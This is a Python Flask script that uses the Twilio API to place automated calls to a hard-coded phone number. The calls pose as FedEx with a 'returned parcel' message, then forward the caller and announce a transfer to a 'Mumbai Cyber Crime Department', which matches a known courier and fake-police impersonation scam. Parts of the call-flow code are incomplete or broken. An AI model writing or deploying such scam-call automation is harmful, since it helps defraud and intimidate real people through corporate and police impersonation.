from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client

app = Flask(__name__)

account_sid = ''
auth_token = ''
client = Client(account_sid, auth_token)

initial_message = 'This is calling from Fedex international courier service. Your parcel has been returned. Please press 1 for more information.'

hold_message = 'Fedex international courier service.'

transfer_message = 'This call has been transferred to the Mumbai Cyber Crime Department.'

@app.route('/make-call', methods=['POST'])
def make_call():
    to = '+919901993641'
    from_number = '+19045724924'
    try:
        call = client.calls.create(
            url='https://a95b-27-7-5-16.ngrok-free.app/voice-response',
            to=to,
            from_=from_number
        )
        print(f'Call initiated: {call.sid}')
        return {'message': 'Call is being placed', 'call_sid': call.sid}, 200
    except Exception as e:
        print(f'Error: {e}')
        return {'message': 'Error making call', 'error': str(e)}, 500
    
@app.route('/voice-response', methods=['POST'])
def voice_response():
    response = VoiceResponse()
    gather = Gather(num_digits=1, action='/gather-response', method='POST', timeout=10)
    gather.say(initial_message)
    response.append(gather)

    response.say('No input received. Goodbye.')
    response.hangup()

    return str(response)

@app.route('/gather-response', methods=['POST'])
def gather_response():
    digits = request.form.get('Digits')
    response = VoiceResponse()

    if digits == '1':
        response.say(hold_message)
        response.pause(length=5)  # Simulate a 5-second hold
        response.dial('+919562152879')
        gather = Gather(num_digits='0', action='/cont', method='POST', timeout=10)

    else:
        # Invalid input, hang up
        response.say('Invalid input. Goodbye.')
        response.hangup()

    return str(response)

@app.route('/cont', methods=['POST'])
def cont():
    digits = request.form.get('Digits')
    print('exec')
    response = VoiceResponse()
    if '##' in digits:
        response.say(transfer_message)
        response.dial('+919074896995')

if __name__ == '__main__':
    app.run(port=3000)
